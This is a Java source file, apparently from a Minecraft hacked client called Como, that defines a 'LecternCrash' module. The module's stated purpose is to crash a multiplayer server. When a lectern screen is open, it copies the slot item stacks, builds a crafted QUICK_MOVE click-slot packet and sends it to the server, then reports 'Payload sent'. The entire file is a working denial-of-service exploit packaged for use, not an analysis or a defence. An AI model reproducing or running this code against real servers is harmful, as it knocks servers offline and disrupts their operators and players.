package net.como.client.module.exploit;

import com.google.common.collect.Lists;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.como.client.ComoClient;
import net.como.client.module.Module;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.Slot;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.collection.DefaultedList;

import java.util.List;

public class LecternCrash extends Module {
    public LecternCrash() {
        this.setDescription("An old exploit which crashes the server using a lectern with a book in it.");
        this.setCategory("Exploit");
    }

    /**
     * Triggered within mixin/botch/LecternScreenMixin.java
     */
    public void perform() {
        // Crashes a server using Coderx's crash exploit!
        // Check them out here: https://github.com/Coderx-Gamer

        ScreenHandler screenHandler = ComoClient.getInstance().me().currentScreenHandler;
        DefaultedList<Slot> defaultedList = screenHandler.slots;
        int slotsSize = defaultedList.size();

        // Get all the slots' ItemStacks
        List<ItemStack> slotStacks = Lists.newArrayListWithCapacity(slotsSize);
        for (Slot Slot : defaultedList) {
            // Copy them
            ItemStack copy = Slot.getStack().copy();

            // Add them
            slotStacks.add(copy);
        }

        Int2ObjectOpenHashMap<ItemStack> int2ObjectOpenHashMap = new Int2ObjectOpenHashMap<>();

        // Get unique ItemStacks
        for (int i = 0; i < slotsSize; i++) {
            ItemStack real = slotStacks.get(i);
            ItemStack active = ((Slot)defaultedList.get(i)).getStack();

            if (!ItemStack.areEqual(real, active)) {
                int2ObjectOpenHashMap.put(i, active.copy());
            }
        }

        // Make the packet
        ClickSlotC2SPacket packet = new ClickSlotC2SPacket(
                screenHandler.syncId,
                screenHandler.getRevision(),
                0, 0,
                SlotActionType.QUICK_MOVE,
                screenHandler.getCursorStack().copy(), (Int2ObjectMap<ItemStack>)int2ObjectOpenHashMap
        );

        ComoClient.getInstance().getClient().getNetworkHandler().sendPacket(packet);

        // Show the message
        this.info("Payload sent");
    }
}
